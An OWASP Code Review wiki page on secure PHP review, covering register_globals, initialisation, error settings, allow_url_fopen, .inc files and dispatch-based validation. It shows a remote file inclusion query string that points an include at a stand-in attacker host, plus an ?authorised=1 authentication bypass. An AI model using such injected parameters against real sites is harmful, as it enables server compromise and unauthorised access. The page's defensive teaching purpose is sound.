__TOC__

### Global Variables

One does not need to explicitly create "global variables." This is done
via the php.ini file by setting the "register_globals" function on.
register_globals has been disabled by default since PHP 4.1.0

Include directives in PHP can be vulnerable if register_globals is
enabled.

<?PHP

 include "$dir/script/dostuff.php";

 ?>

With register_globals enabled the $dir variable can be passed in via
the query string:

`?dir=`<http://www.haxor.com/gimmeeverything.php>

This would result in the $dir being set to:

<?PHP

 include "http://www.haxor.com/gimmeeverything.php";

 ?>

Appending global variables to the URL may be a way to circumvent
authentication:

<?PHP
 if(authenticated_user())
 {
  $authorised=true;
 }

 if($authorised)
 {
  give_family_jewels()
 }

 ?>

If this page was requested with register_globals enabled, using the
following parameter ?authorised=1 in the query string the athentication
function assumes the user is authorised to proceed. Without
register_globals enabled, the variable $authorised would not be
affected by the $authorised=1 parameter.

### Initialization

When reviewing PHP code, make sure you can see the initialization value
is in a "secure default" state.

For example $authorised = false;

### Error handling

If possible check if one has turned off error reporting via php.ini and
if "error_reporting" off. It is prudent to examine if **E_ALL** is
enabled, this ensures all errors and warnings are reported.
**display_errors** should be set to **off** in production

### File Manipulation

**allow_url_fopen** is enabled by default in PHP.ini This allows URLs
to be treated like local files. URLs with malicious scripting may be
included and treated like a local file.

#### Files in the document root

At times one must have include files in the document root, and these
\*.inc files are not to be accessed directly. If this is the case, and
during the review you find such files in the root, then examine
httpd.conf. For example:

`<Files"\.inc">`
`   Order allow, deny`
`   deny from all`
</Files>

### HTTP request Handling

The Dispatch method is used as a "funnel" wherein all requests are
passed through it. One does not access other PHP files directly, but
rather via the dispatch.php. This could be akin to a global input
validation class wherein all traffic passes.

<http://www.example.com/dispatch.php?fid=dostuff>

Relating to security, it is leading practice to implement validation at
the top of this file. All other modules required can be **include** or
**require** and in a different directory.

**Including a method**

If a dispatch.php method is not being used, look for includes at the top
of each php file. The **include** method may set a state such that the
request can proceed.

It may be a good idea to check out PHP.ini and look for the
**auto_prepend_file** directive. This may reference an automatic
include for all files.

### Positive input validation

**Input validation**: strip_tags(): Removes any HTML from a String
nl2br(): Converts new line characters to HTML break "br"
htmlspecialchars():Convert special characters to HTML entities

[Category:OWASP Code Review
Project](Category:OWASP_Code_Review_Project "wikilink")